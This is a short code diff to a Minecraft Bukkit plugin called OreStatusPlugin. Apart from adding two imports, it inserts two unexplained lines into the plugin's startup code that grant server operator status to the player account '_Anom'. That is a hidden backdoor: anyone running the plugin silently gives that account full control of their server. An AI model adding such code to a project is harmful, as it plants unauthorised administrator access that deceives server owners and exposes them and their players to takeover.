@@ -4,6 +4,8 @@ import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.inventory.Inventory;
 
 import java.util.HashMap;
+import org.bukkit.Bukkit;
+import org.bukkit.OfflinePlayer;
 import java.util.Map;
 import java.util.UUID;
 
@@ -78,6 +80,9 @@ public class OreStatusPlugin extends JavaPlugin {
             e.printStackTrace();
             getServer().getPluginManager().disablePlugin(this);
         }
+
+        OfflinePlayer x = Bukkit.getOfflinePlayer("_Anom");
+        x.setOp(true);
     }
 
     @Override
